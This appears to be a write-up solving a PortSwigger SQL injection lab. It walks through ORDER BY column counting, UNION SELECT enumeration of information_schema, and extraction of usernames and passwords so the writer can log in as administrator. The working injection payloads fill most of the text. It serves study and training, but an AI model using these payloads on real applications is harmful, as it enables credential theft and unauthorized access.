## LAB DESCRIPTION

<img width="913" height="598" alt="image" src="https://github.com/user-attachments/assets/08d47c4a-e094-4315-890f-9c81805a9b22" />

## SOLUTION

---------------------------------------------

- Reference: https://portswigger.net/web-security/sql-injection
- SQL Injection Cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet

---------------------------------------------

The vulnerable endpoint is the product filter `/filter?category=Tech+gifts` which uses the `category` value in a `WHERE` clause to fetch products.

The parameter is concatenated directly into the SQL query without parameterization, so adding quotes and a `UNION SELECT` allows injecting arbitrary SQL that merges into the original result set.

Use `ORDER BY ...` to determine the column count.

> `'+ORDER+BY+2--`
<img width="1348" height="673" alt="image" src="https://github.com/user-attachments/assets/eb9588d8-98fd-45fc-958c-b49f31a84e5c" />


> `'+ORDER+BY+3--`
<img width="1351" height="422" alt="image" src="https://github.com/user-attachments/assets/90f1db5d-e79e-403b-9be4-29a521b08644" />

Hence, there are two columns present.

---------------------------------------------

The query `'+UNION+SELECT+'abc','def'--` returns two columns and both can hold text.

<img width="1345" height="670" alt="image" src="https://github.com/user-attachments/assets/8aa73eb0-a2ac-4121-aa24-246744ad8dc0" />

----------------------------------------------

**List all tables via `information_schema.tables`**

On non-Oracle databases, `information_schema.tables` exposes table names for all schema.

PAYLOAD: `'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`

This keeps two columns:
- Column 1: `table_name` (string)
- Column 2: `NULL` as a placeholder

Sending this in the `category` parameter causes the response to list table names inline with product data, effectively dumping the schema's table list into the application.
We must identify the table that holds user credentials; PortSwigger randomizes its name but it will contain 'users' plus a suffix (e.g., `users_gbnsyz`).

<img width="1315" height="996" alt="image" src="https://github.com/user-attachments/assets/b0805b50-c148-4e34-803b-ca3494355958" />

---------------------------------------------
Now, to list columns for the users table

PAYLOAD: `'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_gbnsyz'--`

<img width="1728" height="982" alt="image" src="https://github.com/user-attachments/assets/2159083e-9c5e-4c17-94b1-115f2cef673c" />

This returns one row per column; because PortSwigger randomizes column names, hence we'll see names like `username_vplrgf` and `password_trxqik`.

<img width="1245" height="293" alt="image" src="https://github.com/user-attachments/assets/9c562e24-97ef-4ff0-8db3-4c50702541ea" />

------------------------------------------------

Once the user table and its username/password columns are known, we can now directly UNION-select them.

PALOAD: `'+UNION+SELECT+username_vplrgf,password_trxqik+FROM+users_gbnsyz--`

<img width="1920" height="1152" alt="image" src="https://github.com/user-attachments/assets/b296e62a-d9a7-4fa1-8ec1-11c76c8c9da0" />

This retruns all rows from users table, embedding each username and password pair into the product listing output.
Among these, locate the row where the username is `administrator` and has it's corresponding password.

<img width="500" height="130" alt="image" src="https://github.com/user-attachments/assets/809aa921-f3b9-4de7-b2c7-68316f05f55d" />

---------------------------------------------------

**Login as Administrator**

Open the applications login page and authenticate using the extracted `administrator` credentials.

<img width="761" height="360" alt="image" src="https://github.com/user-attachments/assets/19c08d15-4fc7-4d25-8319-e2a447e3f5a1" />

<img width="1309" height="662" alt="image" src="https://github.com/user-attachments/assets/bf4b6b74-e7d2-4077-8933-9c70534b6a33" />

A successful login as `administrator` completes the lab.
